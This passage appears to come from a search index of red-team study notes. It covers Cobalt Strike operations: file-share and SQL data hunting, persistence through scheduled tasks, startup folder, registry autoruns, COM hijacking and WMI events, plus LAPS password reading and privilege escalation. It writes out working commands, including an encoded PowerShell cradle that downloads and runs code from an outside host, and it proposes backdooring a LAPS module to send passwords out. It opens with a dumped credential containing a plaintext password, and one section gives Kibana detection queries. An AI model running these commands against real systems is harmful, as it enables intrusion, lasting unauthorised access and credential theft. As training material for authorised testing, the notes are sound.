in:C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials\\F3190EBE0498B77B4A85ECBABCA19B6E masterkey:10530dda04093232087d35345bfbb4b75db7382ed6db73806f86238f6c3527d830f67210199579f86b0c0f039cd9a55b16b4ac0a3f411edfacc593a541f8d0d9 TargetName : Domain:batch=TaskScheduler:Task:{86042B87-C8D0-40A5-BB58-14A45356E01C} UserName : CORP\\user CredentialBlob : Passw0rd!"
					}

					
				
			
		
			
				
					,
					

					"red-team-exfiltration": {
						"id": "red-team-exfiltration",
						"title": "Exfiltration",
						"category": "",
						"url": " /red-team/exfiltration/",
						"content": "Organizations will store data in a wide variety of places from file shares, databases, SharePoint, internal wiki’s, etc… Note: When planning the assessment, a good strategy to suggest is to create dummy data. It is not recommended to carry out exfiltration tests with real data (Problems with GDPR). File Shares We can search for shares on a domain. PowerView (dev): Find-DomainShare Find-DomainShare -CheckShareAccess Find-InterestingDomainShareFile searches inside each share, and returns results where the specified strings appears. PowerView (dev): Find-InterestingDomainShareFile -Include *.doc*, *.xls*, *.csv, *.ppt* Finally we can download it: beacon&gt; powershell gc \\\\share.corp.io\\share\\export.csv | select -first 5 Databases PowerUpSQL provides various cmdlets designed for data searching and extraction. Get-SQLColumnSampleDataThreaded can search one or more instances for databases that contains particular keywords in the column names. beacon&gt; powershell Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq \"Accessible\" } | Get-SQLColumnSampleDataThreaded -Keywords \"email,address,credit,card\" -SampleSize 5 | select instance, database, column, sample | ft -autosize This can only search the instances where we have direct access, it will not try any SQL link. To search over the links use Get-SQLQuery. beacon&gt; powershell Get-SQLQuery -Instance \"sql-2.corp.local,1433\" -Query \"select * from openquery(\"\"sql-1.external.local\"\", 'select * from information_schema.tables')\""
					}

					
				
			
		
			
				
					,
					

					"red-team-host-persistence": {
						"id": "red-team-host-persistence",
						"title": "Host Persistence",
						"category": "",
						"url": " /red-team/host-persistence/",
						"content": "Persistence is the method of maintaining access to a compromised machine. Is useful to avoid exploiting the initial compromise steps all over again. Workstations are frequently rebooted If the initial access is obtained though a phishing campaign, and if the current beacon is lost, it could be end of the engagement. Install persistence usually involves making some configuration change or dropping a payload to disk, which is why they can carry a high risk of detection. Note: You must strike a delicate balance of keeping the operation going and getting caught. Userland Persistence Userland persistence involves persistence that can be executed as the current user environment. Common userland persistence methods are: Scheduled Tasks Startup Folder HKCU HKLM Registry Autoruns SharPersist is .NET windows persistence toolkit assembly written by FireEye very useful to make a persistence. https: github.com mandiant SharPersist Parameter Description Values -t Persistence technique keepass, reg, schtaskbackdoor, startupfolder, tortoisesvn, service, schtask -c Command to execute Ex: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -a Arguments for the command Ex: -nop -w hidden -enc SQBF....A== -n Name of the task Ex: Updater -m To add the task add, remove, check, list -o Task frequency env, hourly, daily, logon -f Filename to save Ex: UserEnvSetup -k Registry key to modify Ex: hkcurun -v Name of the registry key to create Ex: Updated Scheduled Tasks The Windows Task Scheduler allows us to create tasks that execute on a pre-determined trigger. That trigger could be a day, when users logon, when the computer goes idle, when its locked and more over. In order to avoid problems of quotations in the IEX cradle, we can encode it in base64 and use the -EncodedCommand or -enc parameter. Note: Use Unicode enconding instead of UTF8 or ASCII at base64 conversion. In PowerShell: PS C:\\&gt; $str = 'IEX ((new-object net.webclient).downloadstring(\"http: 10.10.10.10 a\"))' PS C:\\&gt; [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str)) SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADAALgAxADAALwBhACIAKQApAA== In Bash: kali@kali:~# str='IEX ((new-object net.webclient).downloadstring(\"http: 10.10.10.10 a\"))' kali@kali:~# echo -en $str | iconv -t UTF-16LE | base64 -w 0 SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADAALgAxADAALwBhACIAKQApAA== Finally we can use SharPersist to create a scheduled task. beacon&gt; execute-assembly .\\SharPersist.exe -t schtask -c \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -a \"-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADAALgAxADAALwBhACIAKQApAA==\" -n \"Updater\" -m add -o hourly [*] INFO: Adding scheduled task persistence [*] INFO: Command: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe [*] INFO: Command Args: -nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADAALgAxADAALwBhACIAKQApAA== [*] INFO: Scheduled Task Name: Updater [*] INFO: Option: hourly [+] SUCCESS: Scheduled task added Startup Folder Applications, files and shortcuts within a user’s startup folder are launched automatically when they first log in. It’s commonly used to bootstrap the user’s home environment (set wallpapers, shortcut’s etc). beacon&gt; execute-assembly C:\\Tools\\SharPersist\\SharPersist\\bin\\Debug\\SharPersist.exe -t startupfolder -c \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -a \"-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADAALgAxADAALwBhACIAKQApAA==\" -f \"UserEnvSetup\" -m add [*] INFO: Adding startup folder persistence [*] INFO: Command: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe [*] INFO: Command Args: -nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADAALgAxADAALwBhACIAKQApAA== [*] INFO: File Name: UserEnvSetup [+] SUCCESS: Startup folder persistence created [*] INFO: LNK File located at: C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\UserEnvSetup.lnk [*] INFO: SHA256 Hash of LNK file: B34647F8D8B7CE28C1F0DA3FF444D9B7244C41370B88061472933B2607A169BC Note: In System context this tecnhique does not work. HKCU HKLM Registry Autoruns AutoRun values in HKCU and HKLM allow applications to start on boot. You commonly see these to start native and 3rd party applications such as software updaters, download assistants, driver utilities and so on. HKCU: HKCU autorun will only trigger when the owner of the hive logs into the machine. HKLM: HKLM autorun will trigger when any user logs in the machine. beacon&gt; cd C:\\ProgramData beacon&gt; upload C:\\Payloads\\beacon-http.exe beacon&gt; mv beacon-http.exe updater.exe beacon&gt; execute-assembly C:\\Tools\\SharPersist\\SharPersist\\bin\\Debug\\SharPersist.exe -t reg -c \"C:\\ProgramData\\Updater.exe\" -a \" q n\" -k \"hkcurun\" -v \"Updater\" -m add [*] INFO: Adding registry persistence [*] INFO: Command: C:\\ProgramData\\Updater.exe [*] INFO: Command Args: q n [*] INFO: Registry Key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run [*] INFO: Registry Value: Updater [*] INFO: Option: [+] SUCCESS: Registry persistence added Note: It’s a common misconception that an HKLM autorun will execute the payload as SYSTEM, it will still run under the context of the user’s account. COM Hijacking Component Object Model (COM) is a technology built within the Windows operating system that allows intercommunication between software components of different languages. COMs are identified with a classID CLSID and each component exposes functionality via one or more interfaces IIDs. A COM Class COCLASS is an implementation of one or more interfaces, represented by their CLSID or a programmatic identifier ProgID. COM Classes and interfaces are defined in the registry HKEY_CLASSES_ROOT\\CLSID and HKEY_CLASSES_ROOT\\Interface. An in-processs server allows the specified DLL to be loaded into the process of the calling application. InProcServer32 registers a 32-bit in-process server. The ThreadingModel can be Apartment (Single-Threaded), Free(Multi-Threaded), Both (Single or Multi) or Neutral (Thread Neutral). It is possible to find LocalServer32 wich provides a path to an EXE file. OleView .NET is a tool that allows us to find and inspect COM components. https: github.com tyranid oleviewdotnet COM Hijacking is possible when we are able to modify these entries to point to a different DLL. It is important to notice that when an application attempts to locate an object, there is a search order that it goes through. First search HKEY_CURRENT_USER (HKCU) and after that HKEY_LOCAL_MACHINE (HKLM). So if a COM Object is located within HKLM, we can place a duplicate entry into HKCU which will be executed first. Note: BE CAREFUL we can break the functionlity of an application or maybe the whole OS. Abandoned Keys Instead of hijacking COM objects that are in-use and breaking applications that rely on them, a safer strategy is to find instances of applications that are trying to load objects that don’t actually exist, it’s called abandoned keys. We are going to use Process Monitor procmon64.exe of SysInternals. Due to the high amount of that will be captured, we need to apply a filter. Add the following filters and disable the current ones: Operation is RegOpenKey Result is NAME NOT FOUND Path ends with InprocServer32 Note: Use one that is loaded semi-frequently, hijack one that is loaded every couple of seconds would be noisy and rough. We can use powershell to check that the entry does exist in HKLM, but not in HKCU. PS C:\\&gt; Get-Item -Path \"HKLM:Software\\Classes\\WOW6432Node\\CLSID\\{4590F811-1D3A-11D0-891F-00AA004B2E24}\\InprocServer32\" Name Property ---- -------- InprocServer32 (default) : C:\\WINDOWS\\system32\\wbem\\wbemprox.dll ThreadingModel : Both PS C:\\&gt; Get-Item -Path \"HKCU:Software\\Classes\\WOW6432Node\\CLSID\\{4590F811-1D3A-11D0-891F-00AA004B2E24}\\InprocServer32\" Get-Item : Cannot find path 'HKCU:\\Software\\Classes\\WOW6432Node\\CLSID\\{4590F811-1D3A-11D0-891F-00AA004B2E24}\\InprocServer32' porque no existe. In order to exploit this, we need to create the necessary registry entries in HKCU and point them to our Beacon DLL. New-Iten -Path \"HKCU:Software\\Classes\\WOW6432Node\\CLSID\" -Name \"{4590F811-1D3A-11D0-891F-00AA004B2E24}\" New-Item -Path \"HKCU:Software\\Classes\\WOW6432Node\\CLSID\\{4590F811-1D3A-11D0-891F-00AA004B2E24}\" -Name \"InprocServer32\" -Value \"C:\\Windows\\Temp\\beacon.dll\" New-ItemProperty -Path \"HKCU:Software\\Classes\\WOW6432Node\\CLSID\\{4590F811-1D3A-11D0-891F-00AA004B2E24}\\InprocServer32\" -Name \"ThreadingModel\" -Value \"Both\" Hijackeable COM components in Task Scheduler Task Scheduler is another great place to look for hijackeble COM components. We can use the following script of powershell to find compatible tasks. $Tasks = Get-ScheduledTask foreach ($Task in $Tasks) { if ($Task.Actions.ClassId -ne $null) { if ($Task.Triggers.Enabled -eq $true) { if ($Task.Principal.GroupId -eq \"Users\") { Write-Host \"Task Name: \" $Task.TaskName Write-Host \"Task Path: \" $Task.TaskPath Write-Host \"CLSID: \" $Task.Actions.ClassId Write-Host } } } } We can lookup the current implementation of a component in HKEY_CLASSES_ROOT\\CLSID. PS C:\\&gt; Get-ChildItem -Path \"Registry::HKCR\\CLSID\\{01575CFE-9A55-4003-A5E1-F38D1EBDCAAA}\" Name Property ---- -------- InprocServer32 (default) : C:\\Windows\\system32\\MsCtfMonitor.dll ThreadingModel : Both And we can check if the InprocServer32 is currently implemented in HKLM and not in HKCU. PS C:\\&gt; Get-Item -Path \"HKLM:Software\\Classes\\CLSID\\{01575CFE-9A55-4003-A5E1-F38D1EBDCAAA}\" | ft -AutoSize Name Property ---- -------- {01575CFE-9A55-4003-A5E1-F38D1EBDCAAA} (default) : MsCtfMonitor task handler PS C:\\&gt; Get-Item -Path \"HKCU:Software\\Classes\\CLSID\\{01575CFE-9A55-4003-A5E1-F38D1EBDCAAA}\" Get-Item : Cannot find path 'HKCU:\\Software\\Classes\\CLSID\\{01575CFE-9A55-4003-A5E1-F38D1EBDCAAA}' because it does not exist. Elevated Persistence We can also add persistence mechanisms to mantain SYSTEM access. Note: SYSTEM processes cannot authenticate to a web proxy, so we can’t use HTTP Beacones, use P2P or DNS Beacons instead. Windows Services We can create our own service with AUTO_START with SharpPersist. beacon&gt; upload C:\\Payloads\\dns-svc.exe beacon&gt; execute-assembly .\\SharpPersist.exe -t service -c \"C:\\Windows\\dns-svc.exe\" -n \"dns-svc\" -m add [*] INFO: Adding service persistence [*] INFO: Command: C:\\Windows\\dns-svc.exe [*] INFO: Command Args: [*] INFO: Service Name: dns-svc [+] SUCCESS: Service persistence added This will create a new service in a STOPPED state, but with the START_TYPE set to AUTO_START, which means that whe service won’t run until the machine is rebooted. WMI Event Subscriptions Persistence via WMI events can be achieved by leveraging the following three classes: EventCostumer: Is the action that we want to perform (execute a payload). EventFilter: The trigger that we can act upon. FilterToConsumerBinding: Links an EventCostumer and EventFilter together. PowerLuk is a PowerShell tool for building these WMI queries. https: github.com Sw4mpf0x PowerLurk beacon&gt; upload C:\\Payloads\\dns_x64.exe beacon&gt; powershell-import .\\PowerLuk.ps1 beacon&gt; powershell Register-MaliciousWmiEvent -EventName WmiBackdoor -PermamentCommand \"C:\\Windows\\dns_x64.exe\" -Trigger ProcessStart -ProcessName notepad.exe You can view these classes with: Get-WmiEvent -Name WmiBackdoor We can remove the backdoor with: Get-WmiEvent -Name WmiBackdoor | Remove-WmiObject"
					}

					
				
			
		
			
				
					,
					

					"red-team-host-privilege-escalation": {
						"id": "red-team-host-privilege-escalation",
						"title": "Host Privilege Escalation",
						"category": "",
						"url": " /red-team/host-privilege-escalation/",
						"content": "Privilege escalation allows us to elevate privileges from a user to local administrator. Notice that is not a necessary step, elevated privileges can provide a tactical advantage by allowing you to leverage some additional capabilities (dumping creds with Mimikatz or manipulate host configuration). Note: We need to mantain the principle of least privilege to reach the assessment goal. Exploiting a pirivilege escalation vulnerability provides defenders with additional data points to detect the presence. SharpUp is C# version of PowerUp. https: github.com GhostPack SharpUp Different techniques to exploit privilege escalation are detailed on https: mvc1009.github.io hackingnotes privilege-escalation windows-privesc on this gitbook. Windows Services A Windows “service” is a special type of application that is usually started automatically when the computer boots. Services are used to start and manage core Windows functionality such as Windows Defender, Windows Firewall, Windows Update and more. Third party applications may also install a Windows Service to manage how and when they’re run. OPSEC Alert: Restore the service configuration once you are done. Ensure you don’t interrupt business critical services, so seek permission before exploiting these types of vulnerabilities. Unquoted Service Path An unquoted service path is where the path to the service binary is not wrapped in quotes. It’s not a problem but in certain environment it can lead to privilege escalation. beacon&gt; run wmic service get name,pathname Note: Standard users cannot stop, restart or start services by default, so you would usually need to wait for a computer reboot. Always Install Elevated This policy allows standard users to install applications that require access to directories and registry keys that they may not usually have permission to change. This is equivalent to granting full administrative rights and even though Microsoft strongly discourages its use, it can still be found. Note: When this MSI is eventually installed, it will appear as an installed program on the target. Change properties such as Author and Manufacturer."
					}

					
				
			
		
			
				
					,
					

					"red-team-host-reconnaissance": {
						"id": "red-team-host-reconnaissance",
						"title": "Host Reconnaissance",
						"category": "",
						"url": " /red-team/host-reconnaissance/",
						"content": "After compromising a target is important to collect as many data as possible without being detected. .NET version In order to execute our binaries as desired we need to compile them in the correct .NET version. We can check version installed with: beacon&gt; reg queryv x64 HKLM\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4\\Full Release We can check the version on microsoft documentation. https: docs.microsoft.com en-us dotnet framework migration-guide versions-and-dependencies We don’t have to compile our binary with the exact version of .NET installed on the target machine. The Common Language Runtime (CLR) is a component of .NET Framework that manages the execution of .NET assemblies, and each .NET framework release is designed to run on a specific version of CLR. We just need to compile our assemblie on a version with the same CLR of the target. .NET Framework Version CLR Version 2.0, 3.0, 3.5 2 4, 4.5-4.8 4 Host Safety-Checks Seatbelt is a .NET application written in C# that makes various checks. beacon&gt; execute-assembly C:\\Tools\\Seatbelt\\Seatbelt\\bin\\Debug\\Seatbelt.exe -group=system https: github.com GhostPack Seatbelt Note: The source code should be compiled with the .NET CLR version of the target. With the parameter -group=user we can enumerate the user’s environment. beacon&gt; execute-assembly C:\\Tools\\Seatbelt\\Seatbelt\\bin\\Debug\\Seatbelt.exe -group=user Web Proxies A web proxy acts an intermediary between a client and a target web server. They are commonly deployed across organizations for filtering, monitoring, performance and security. SSL offloading can even be used to inspect HTTPS traffic. This is achieved by establishing two independent HTTPS sessions, one between the client and the proxy and the other one between the proxy and the server. So our HTTP beacon traffic may be logged. We can check internet settings with Seatbelt. beacon&gt; execute-assembly .\\Seatbelt.exe InternetSettings HKCU ProxyEnable : 1 HKCU ProxyOverride : ;local HKCU ProxyServer : squid.corp.local:8080 There are differents methods to see if we are reciving traffic through a web proxy, one method is to sniff the traffic and see with wireshark if any additional headers add added by the proxy."
					}

					
				
			
		
			
				
					,
					

					"red-team-introduction": {
						"id": "red-team-introduction",
						"title": "Introduction",
						"category": "",
						"url": " /red-team/introduction/",
						"content": "Red Team Red Teaming is the process of using tactics, techniques and procedures (TTPs) to emulate a real-world threat, with the goal of measuting the effectiveness of the people, processes and technologies used to defend an environment. Read Teaming is often confused with Penetration Testing, but there are some key differences. On one hand a Pentest is focused into identifying as many vulnerabilities as possible, demostrate how those may be exploited, and provide some contextual risk ratings. Normally Pentest are part ofa complicance requirement for example a montlhy or annual assessments. On the other hand, red teams have a clear objective defined by the organization, gain access to a particular system, email accounts, database or file shares. The organizations are defending “something” and compromising the confidentiality, integrity and availability of that “something” represents a tangible risk which can be financial or reputational. A Red Team will emulate a real-life threat to the organization. To challenge the detection and response capabilities, they need to reach the objective without getting caught, part of this is not compromising unnecessarily high-privileged accounts such as Domain Admins. Operations Security (OPSEC) Operations Security, known as OPSEC is a term originating in the U.S military and adopted by the information security community. It’s generally used to describe the ease with which actions can be observerd by enemy intelligence. From the perspective of a Red Team, this would be a measure of how easy your actions can be observed and subsequently interrupted by a Blue Team. Threat Model The role of a Red Team is to emulate a genuine threat to the organization. Can vary from low-skilled script kiddies to a more capable and oranised hacktivist group, or even APTs and nation-states. Once a threat has been identified, the team would build a corresponding threat profile. This threat profile will define how the team will emulate this trheat by identifying its intent, motivations, capabilities, habits, TTPs and so on. MITRE ATT&amp;CK is a great source to find these tactics and techniques. https: attack.mitre.org matrices enterprise Breach Model The Breach Model outlines the means by which the red team will gain access to the target environment. This is usually by attempting to gain access in accordance with the threat or provided by the organization often called “Assume Breach”. It is important to have a backup plan in the event access if a assume breach is not chosend and the red team is not able to gain initial access. A compromise could be to revert to an assumed breach if the red team has not gained access in the first 25% of engagement timeframe. This is critical because red team assessments are more about detection and response, rather than prevention, so those portions of the assessment are more important than trying to “prove” a breach can happen in the first place."
					}

					
				
			
		
			
				
					,
					

					"red-team-kibana": {
						"id": "red-team-kibana",
						"title": "Kibana - The Security App",
						"category": "",
						"url": " /red-team/kibana/",
						"content": "PowerShell Remoting Search for Powershell Remoting (egress network) event.module : sysmon and event.type : connection and network.direction : egress and destination.port : 5985 There is the process start event for wsmprovhost.exe with an -Embedding parameter in the command arguments. event.module : sysmon and event.type : process_start and process.command_line : \"C:\\\\Windows\\\\system32\\\\wsmprovhost.exe -Embedding\" PowerShell logging will also provide the script block, which tell us exactly which code or commands were executed. Note: Use the process.pid from the previous query to find its associated script block. event.module : powershell and winlog.process.pid: 2984 PsExec We can build a detection, because we can correlate events such as: File creation. Service installed. Process start. Cobalt strike by default have some behaviours that we can modify: It uses the same name for the service and the exe. The name is a random alphanumeric string of lentgh 7. The service binary is always dropped into C:\\Windows. psexec and psexec64 are the only jump methods that will perform a process migration automatically with rundll32, so it can automatically delete the service binary from disk. It’s parent process will be the service binary and would result ini a further process create event. psexec_psh will execute PowerShell via %COMSPEC% which if the default command line interpreter, usually cmd.exe. event.module : sysmon and event.type : creation and event.category : file and file.extension : exe and file.directory : \"C:\\\\Windows\" event.provider : \"Service Control Manager\" and message : \"A service was installed\" Windows Management Instrumentation (WMI) When binaries are executed via WMI, it will be a child of WmiPrvSE.exe. We can look for process create event where WmiPrvSE is the parent. event.module: sysmon and event.type : process_start and process.parent.name : WmiPrvSE.exe Distributed Component Object Model (DCOM) Processes started via DCOM may also be seen where the parent is svchost.exe which is started with the command line -k DcomLaunch. Make Token The make_token module of C2 create a token in order to impersonate a user with their credentials. The user of make_token generates the even 4624: An account was successfully logged on. This event is very common in Windows domain, but can be narrowed down by filtering on the Logon Type. make_token uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9. event.code: 4624 and winlog.event_data.LogonType: 9 Spawn Like make_token this will generate the follwing alert 4624: An account was successfully logged on. but with the logon type 2 LOGON32_LOGON_INTERACTIVE. event.type: process_start and process.name: rundll32.exe Pass The Hash Sysmon will record the pass the hash technique with the event of a process creation for cmd.exe including the command line arguments echo 1cbe909fe8a &gt; \\\\.\\pipe\\16ca6d. This unsual pattern can be searched with: event.module: sysmon and event.type: process_start and process.name: cmd.exe and process.command_line: *\\\\\\\\.\\\\pipe\\\\* It will also generate a 4624 event with the logon type 9. event.code: 4624 and winlog.logon.id: 0xe6d64 Over Pass The Hash When a TGT is requested and 4768: A Kerberos authentication ticket (TGT) was requested event is created. By default windows uses AES256 (0X12) as KeyType but if no AESKeys is used during the attack a 4768 with RC4-HMAC (0x17) as KeyType is generated. event.code: 4768 and winlog.event_data.TicketEncryptionType: 0x17 Kerberoasting Every time a TGS is requested a windows event 4769 - A Kerberos service ticket was requested is generated. Be careful while doing kerberoasting, it could be some HONEYPOTS. event.code: 4769 and winlog.event_data.ServiceName : svc_honey AS-REP Roasting AS-REP Roasting with Rubeus will generate a 4768 with an encryption type of 0x17 and preauth type of 0. There is no opsec option to AS-REP Roast with a high encryption type and even if there was, it would make the hash much harder to crack. event.code: 4768 AD CS Abuse When a certificate request is made, the CA generates a 4886 - Certificate Services received a certificate request. event.code: 4886 If the request is successful, and a certificate issued, the CA generates a 4887 - Certificate Services approved a certificate request and issued a certificate. event.code: 4887 The template name is not logged and neither is the subject alternate name. There is practically no indication which are malicious requests. The defender would have to go to the CA itself and lookup the certificate by way of the Request ID. Finally when a TGT is requested, the DC generates a 4768 event. Note: Not easy to correlate."
					}

					
				
			
		
			
				
					,
					

					"red-team-laps": {
						"id": "red-team-laps",
						"title": "Local Administrator Password Solution (LAPS)",
						"category": "",
						"url": " /red-team/laps/",
						"content": "LAPS is a Microsoft solution for managing the credentials of a local administrator account on every machine, either the default RID 500 or a custom account. It ensures that the password for each account is different, random, and automatically changed on a defined schedule. Permission to request and reset the credentials can be delegated, which are also auditable. Here is a quick summary of how LAPS works: The Active Directory schema is extended and adds two new properties to computer objects, called ms-Mcs-AdmPwd and ms-Mcs-AdmPwdExpirationTime. By default, the DACL on ms-Mcs-AdmPwd only grants Domain Admins but each computer is given permission to update these properties on itself. Rights to read AdmPwd can be delegated to other principals (users, groups, etc) which is typically done at the OU level. A new GPO template is installed, which is used to deploy the LAPS configuration to machines. The LAPS client is also installed on every machine. When a machine performs a gpudate, it will check the AdmPwdExpirationTime property on its own computer. If the time has elapsed, it will generate a new password and sets it on the ms-Mcs-AdmPwd property. Hunting LAPS AdmPwd.dll on disk. There are few methods to check for the presence of LAPS. If it’s applied to a machine AdmPwd.dll will be on disk. beacon&gt; ls C:\\Program Files\\LAPS\\CSE Size Type Last Modified Name ---- ---- ------------- ---- 179kb fil 05 05 2021 07:04:14 AdmPwd.dll Via GPO. We can search for GPO that have “LAPS” or some other descriptive term in the name Get-DomainGPO | ?{$_.DisplayName -like \"*laps*\"} | select DisplayName, Name, GPCFileSyspath |fl ms-Mcs-AdmPwdExpirationTime property not null on a computer. When LAPS is installed on a computer the property ms-Mcs-AdmPwdExpirationTime will have a value set, every domain user can read this property. Get-DomainComputer | ?{$_.\"ms-Mcs-AdmPwdExpirationTime\" -ne $null} | select dnsHostName Downloading LAPS Configuration If we locate the correct GPO, we can download the LAPS configuration form the gpcfilesyspath. \\\\corp.local\\SysVol\\dev.cyberbotic.io\\Policies\\{2BE4337D-D231-4D23-A029-7B999885E659}\\Machine\\Registry.pol We can parse the pol file with Parse-PolFile from the GPRegistryPolicyParser package. https: github.com PowerShell GPRegistryPolicyParser Parse-PolFile .\\Registry.pol KeyName : Software\\Policies\\Microsoft Services\\AdmPwd ValueName : PasswordComplexity ValueType : REG_DWORD ValueLength : 4 ValueData : 3 KeyName : Software\\Policies\\Microsoft Services\\AdmPwd ValueName : PasswordLength ValueType : REG_DWORD ValueLength : 4 ValueData : 14 KeyName : Software\\Policies\\Microsoft Services\\AdmPwd ValueName : PasswordAgeDays ValueType : REG_DWORD ValueLength : 4 ValueData : 30 KeyName : Software\\Policies\\Microsoft Services\\AdmPwd ValueName : AdminAccountName ValueType : REG_SZ ValueLength : 20 ValueData : LapsAdmin KeyName : Software\\Policies\\Microsoft Services\\AdmPwd ValueName : AdmPwdEnabled ValueType : REG_DWORD ValueLength : 4 ValueData : 1 KeyName : Software\\Policies\\Microsoft Services\\AdmPwd ValueName : PwdExpirationProtectionEnabled ValueType : REG_DWORD ValueLength : 4 ValueData : 0 Reading ms-Mcs-AdmPwd PowerView We can discover which principals are allowed to read the ms-Mcs-AdmPwd attribute by reading its DACL on each computer object. PowerView (dev): ```powershell Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $.ObjectAceType -eq “ms-Mcs-AdmPwd” -and $.ActiveDirectoryRights -match “ReadProperty” } | select ObjectDn, SecurityIdentifier ObjectDN SecurityIdentifier ——– —————— CN=WKSTN-2,OU=Workstations,DC=corp,DC=local S-1-5-21-569305411-121244042-2357301523-1107 We can check the Name of the principal from a SID. ```powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107 CORP\\Support Engineers LAPSToolkit LAPSToolkit is a dedicated PowerShell tooling that can help us. https: github.com leoloobeek LAPSToolkit First such as PowerView we need to import the module. Import-Module .\\LAPSToolit.ps1 Find-LAPSDelegatedGroups will query each OU and find domain groups that have delegated read access Find-LAPSDelegatedGroups Find-AdmPwdExtendedRights goes a little deeper and queries each individual computer for users that have “All Extended Rights”. This will reveal any users that can read the attribute without havind had it specifically delegated to them. Get LDAP Password Finally we just need to read the attribute. PowerView (dev): Get-DomainComputer -Identity WKSTN-1 -Properties ms-Mcs-AdmPwd Password Expiration Protection If the PwdExpirationProtectionEnabled policy is enabled, prevents a user of computer setting the expiration date of a password beyond the password age specified in the PasswordAgeDays. It means that if password expiration is enabled and we attempted to modify its expiration date beyond the value set, it would trigger an automatic reset of that password. But if its not configured in the GPO, then password expiration protection is disabled by default. Note: The expiration date is an 18-digit timestamp calculated as the number of 100-nanoseconds interavals. We can use a epoch converter https: www.epochconverter.com ldap to translate these timestamps to human-readable format. Persistence by pushing the expiry out First we need to convert the wanted data to epoch. In that case I will use 141940046450000000 which is translated to 16 October 2050 11:04:05. With a elevated shell we just need to modify the attribute. Set-DomainObject -Identity WKSTN-1 -Set @{'ms-Mcs-AdmPwdExpirationTime' = '141940046450000000'} -Verbose Setting 'ms-Mcs-AdmPwdExpirationTime' to '141940046450000000' for object 'WKSTN-1$' OPSEC Alert: The expiration date will still be visible to amdins and a manual reset will change the password and restore the expiration date. Backdoor in LAPS Since Powershell heavily utilises the .NET framework, the dlls are written in C# which makes them fairly trivial to download, modify and re-upload. We can modify the source code of the PowerShell cmdlet Get-AdmPwdPassword to install a backdoor. beacon&gt; ls [*] Listing: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\AdmPwd.PS\\ Size Type Last Modified Name ---- ---- ------------- ---- dir 08 16 2022 13:04:13 en-US 24kb fil 05 05 2021 12:04:14 AdmPwd.PS.dll 5kb fil 04 28 2021 18:56:38 AdmPwd.PS.format.ps1xml 4kb fil 04 28 2021 18:56:38 AdmPwd.PS.psd1 26kb fil 05 05 2021 12:04:14 AdmPwd.Utils.dll We can download AdmPwd.PS.dll open it with dnSpy and modify the class GetPassword. Here we can inject our backdoor, we can simply send the plaintext password via internet, print on a file etc…"
					}

					
				
			
		
			
				
					,
					

					"red-team-lateral-movement": {
						"id": "red-team-lateral-movement",
						"title": "Lateral Movement",
						"category": "",
						"url": " /red-team/lateral-movement/",
						"content": "Moving laterally between computers in a domain is important for accessing sensitive information materials, and obtaining new credentials. In this section we are goingto see how do a lateral movement with Cobalt Strike Execution commands Cobalt Strike provides three strategies for executing Beacons, code or commands on remote targets. To execute commands remotely we need admin privileges. OPSEC Note: A common way of testing local admin access on a target is to list the C$ directory. beacon&gt; ls \\\\dc01\\c$ Jump jump command will spawn a beacon payload on the remote target, and if we use a P2P listener, will connect automatically. Usage of jump command: jump [method] [target] [listener] We can use different methods: beacon&gt; jump Beacon Remote Exploits ====================== Exploit Arch Description ------- ---- ----------- psexec x86 Use a service to run a Service EXE artifact psexec64 x64 Use a service to run a Service EXE artifact psexec_psh x86 Use a service to run a PowerShell one-liner winrm x86 Run a PowerShell script via WinRM winrm64 x64 Run a PowerShell script via WinRM Remote-exec remote-exec command will simply execute commands on a remote target. hey require more manual work to manage the payload, but do offer a wider degree of control over what gets executed on the target. You also need to connect to P2P Beacons manually using connect or link. beacon&gt; remote-exec Beacon Remote Execute Methods ============================= Methods Description ------- ----------- psexec Remote execute via Service Control Manager winrm Remote execute via WinRM 